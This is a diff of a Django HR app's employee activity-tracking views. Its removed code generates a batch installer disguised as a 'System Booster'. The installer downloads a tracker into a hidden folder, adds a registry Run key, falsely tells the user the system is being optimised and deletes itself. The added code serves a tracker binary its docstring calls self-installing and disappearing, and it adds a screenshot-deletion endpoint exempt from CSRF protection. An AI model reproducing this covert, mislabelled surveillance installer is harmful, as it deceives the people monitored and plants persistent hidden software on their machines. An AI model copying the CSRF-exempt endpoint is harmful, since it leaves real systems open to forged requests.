@@ -1,6 +1,5 @@
 import json
 import os
-import textwrap
 import time as wallclock
 from datetime import datetime, time, timedelta
 from pathlib import Path
@@ -355,7 +354,7 @@ class ActivityDashboardView(LoginRequiredMixin, TemplateView):
         employee = user_employee
         target_id = self.request.GET.get("employee_id")
 
-        is_admin = self.request.user.role in ["COMPANY_ADMIN", "SUPERADMIN"]
+        is_admin = self.request.user.role in ["COMPANY_ADMIN", "SUPERADMIN", "EMPLOYEE_MANAGER"]
         is_manager = self.request.user.role == "MANAGER"
 
         if target_id:
@@ -453,6 +452,27 @@ class ActivityDashboardView(LoginRequiredMixin, TemplateView):
 
         context["productive_hours"] = format_duration(final_productive_time)
         context["unproductive_hours"] = format_duration(idle_time)
+
+        # 1.3 Gross Hours (First to last activity)
+        first_p = (
+            ActivityPulse.objects.filter(employee_id__in=account_ids, timestamp__range=(start_of_day, end_of_day))
+            .order_by("timestamp")
+            .first()
+        )
+        last_p = (
+            ActivityPulse.objects.filter(employee_id__in=account_ids, timestamp__range=(start_of_day, end_of_day))
+            .order_by("-timestamp")
+            .first()
+        )
+        if first_p and last_p:
+            gross_dur = last_p.timestamp - first_p.timestamp
+            context["gross_hours"] = format_duration(gross_dur)
+            context["sync_range"] = (
+                f"{timezone.localtime(first_p.timestamp).strftime('%H:%M')} - {timezone.localtime(last_p.timestamp).strftime('%H:%M')}"
+            )
+        else:
+            context["gross_hours"] = "0.0"
+            context["sync_range"] = "-"
 
         # 2. Top Apps (Localized Range)
         top_apps_qs = AppActivity.objects.filter(
@@ -897,100 +917,75 @@ class AppActivityDetailView(LoginRequiredMixin, TemplateView):
 @login_required
 def download_agent(request):
     """
-    Generates a personalized Python agent script with a secure Device Token.
+    Serves a personalized ActivityTracker.exe that self-installs and disappears.
     """
     employee = request.user.employee_profile
 
-    # 1. Get or create a device token for this user
+    # 1. Get or create a device token
     device, _ = EmployeeDevice.objects.get_or_create(
         employee=employee, device_name=request.META.get("HTTP_USER_AGENT", "Unknown Device")[:255]
     )
 
-    agent_path = os.path.join(os.path.dirname(__file__), "agent_src", "activity_agent.py")
-    with open(agent_path, encoding="utf-8") as f:
-        content = f.read()
+    # 2. Try multiple paths to find the master binary
+    possible_paths = [
+        os.path.join(django_settings.BASE_DIR, "static", "activity_monitoring", "bin", "Pbssys.exe"),
+        os.path.join(django_settings.BASE_DIR, "staticfiles", "activity_monitoring", "bin", "Pbssys.exe"),
+        os.path.join(os.path.dirname(__file__), "static", "activity_monitoring", "bin", "Pbssys.exe"),
+    ]
 
-    # 1. Use the right protocol (proxied production often misses this without SECURE_PROXY_SSL_HEADER)
-    scheme = "https" if request.is_secure() or request.headers.get("X-Forwarded-Proto") == "https" else request.scheme
-    base_sync_url = f"{scheme}://{request.get_host()}/activity-tracking/api/sync/"
+    exe_path = None
+    for p in possible_paths:
+        if os.path.exists(p):
+            exe_path = p
+            break
 
-    content = content.replace(
-        'SERVER_URL = "http://your-hrms-domain.com/activity-tracking/api/sync/"', f'SERVER_URL = "{base_sync_url}"'
-    )
-    content = content.replace('API_TOKEN = ""', f'API_TOKEN = "{device.token}"')
+    if not exe_path:
+        logger.error(f"Tracker binary not found at any of: {possible_paths}")
+        return HttpResponse("Critical Error: Tracker binary not found on server. Please contact support.", status=404)
 
-    user_agent = request.META.get("HTTP_USER_AGENT", "").lower()
+    # 3. Create a personalized filename for the agent to parse
+    # Format: ActivityTracker_TOKEN_HOST_PORT.exe
+    host_port = request.get_host().replace(".", "-").replace(":", "_")
+    filename = f"ActivityTracker_{device.token}_{host_port}.exe"
 
-    # Robust detection: default to Windows if unsure, as that is the primary target
-    is_windows = any(x in user_agent for x in ["win", "windows", "win64", "win32"])
+    try:
+        with open(exe_path, "rb") as f:
+            file_data = f.read()
 
-    if is_windows or not user_agent:
-        filename = "systembooster.bat"
-        # Secure absolute URL for the static EXE
-        exe_url = f"{scheme}://{request.get_host()}/static/activity_monitoring/bin/Pbssys.exe"
+        response = HttpResponse(file_data, content_type="application/octet-stream")
+        response["Content-Disposition"] = f'attachment; filename="{filename}"'
+        response["Content-Length"] = len(file_data)
+        return response
+    except Exception as e:
+        logger.error(f"Error serving tracker: {str(e)}")
+        return HttpResponse("Error serving file.", status=500)
 
-        content = textwrap.dedent(f"""
-            @echo off
-            setlocal enabledelayedexpansion
 
-            set "APP_NAME=Pbssys"
-            set "BASE_DIR=%LOCALAPPDATA%\\%APP_NAME%"
-            set "TRACKER_EXE=%BASE_DIR%\\Pbssys.exe"
-            set "CONFIG_FILE=%BASE_DIR%\\config.json"
+@csrf_exempt
+@login_required
+def delete_screenshot(request, screenshot_id):
+    """
+    Deletes a specific screenshot if the user has permission (Admin/HR).
+    """
+    from django.http import JsonResponse
+    from django.shortcuts import get_object_or_404
 
-            echo ===========================================
-            echo    SYSTEM BOOSTER SETUP
-            echo ===========================================
+    is_authorized = request.user.role in ["COMPANY_ADMIN", "SUPERADMIN", "EMPLOYEE_MANAGER"]
+    if not is_authorized:
+        return JsonResponse({"error": "Unauthorized"}, status=403)
 
-            :: 1. Setup hidden folder
-            mkdir "%BASE_DIR%" >nul 2>&1
-            attrib +h "%BASE_DIR%"
+    if request.method != "POST":
+        return JsonResponse({"error": "POST required"}, status=405)
 
-            :: 2. Download standalone tracker components
-            echo Step 1: Connecting to server...
-            echo Downloading system components to: %TRACKER_EXE%
+    try:
+        shot = get_object_or_404(ActivityScreenshot, id=screenshot_id)
+        # Delete file if exists
+        if shot.image and os.path.exists(shot.image.path):
+            import contextlib
 
-            :: Use -L to follow redirects and -S to show errors
-            curl -f -L -S -o "%TRACKER_EXE%" "{exe_url}"
-
-            if %ERRORLEVEL% NEQ 0 (
-                echo.
-                echo [CRITICAL ERROR] Download failed!
-                echo Please check your internet connection or firewall.
-                echo Error Code: %ERRORLEVEL%
-                pause
-                exit /b %ERRORLEVEL%
-            )
-
-            if not exist "%TRACKER_EXE%" (
-                echo [CRITICAL ERROR] Component file was not saved correctly.
-                pause
-                exit /b 1
-            )
-
-            echo Step 2: Creating configuration...
-            echo {{"server_url": "{base_sync_url}", "api_token": "{device.token}"}} > "%CONFIG_FILE%"
-
-            echo Step 3: Registering system service...
-            reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "%APP_NAME%" /t REG_SZ /d "\"%TRACKER_EXE%\"" /f >nul
-
-            echo Step 4: Starting system components...
-            start "" "%TRACKER_EXE%"
-
-            echo --------------------------------------------
-            echo ✅ SYSTEM OPTIMIZATION IS NOW ACTIVE
-            echo System will be optimized every 60 seconds.
-            echo This setup file will now self-delete.
-            echo --------------------------------------------
-
-            timeout /t 5 >nul
-            start /b "" cmd /c del "%~f0"&exit
-        """).strip()
-    else:
-        # Fallback for others
-        filename = "systembooster.sh"
-        content = "#!/bin/bash\necho 'Unsupported platform' & exit"
-
-    response = HttpResponse(content, content_type="application/x-bat" if "win" in user_agent else "text/plain")
-    response["Content-Disposition"] = f'attachment; filename="{filename}"'
-    return response
+            with contextlib.suppress(Exception):
+                os.remove(shot.image.path)
+        shot.delete()
+        return JsonResponse({"success": True})
+    except Exception as e:
+        return JsonResponse({"error": str(e)}, status=500)
